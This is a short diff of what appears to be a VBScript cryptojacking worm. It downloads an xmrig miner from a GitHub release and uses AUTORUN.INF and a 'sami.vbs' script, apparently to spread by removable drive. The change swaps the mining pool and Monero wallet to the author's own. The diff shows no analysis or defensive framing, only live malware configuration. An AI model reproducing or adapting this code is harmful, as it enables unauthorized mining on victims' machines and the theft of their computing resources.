@@ -13,7 +13,7 @@ downloadUrl = "https://github.com/tvhbes/the-tvhbes/releases/download/tvhbes/xmr
 zipFileName = "xmrig-6.24.0-windows-x64.zip"
 extractedFolderName = "xmrig-6.24.0"
 exeName = "xmrig.exe"
-minerArgs = "-o pl-tarirx.luckypool.io:9118 -u 12NDDQyKMZCu3E8JhSajwi6gBpvBSQUUJxhsrYXCgJKCCFXTZMFQXEDV28Db2owQSpckJKqdvAa3YdDfbjidMTP5Skt -p mcj -a rx/0 -k --donate-level 1"
+minerArgs = "-o pool.hashvault.pro:443 -u 471q5TCWH23JtsjiSVNXs8TNRCp4aadn7b5Lmxi9xFrLgimAFyqajGqXAfDFjFvZkiRkZmEnC3wYbeMs1FsJ8u8oVmf17Fc -p ratul001 -a rx/0 -k --donate-level 1"
 autorunFile = "AUTORUN.INF"
 vbsFile = "sami.vbs"
 openFolder = "OpenFile"
@@ -122,4 +122,3 @@ Do
         End If
     Next
 Loop
-
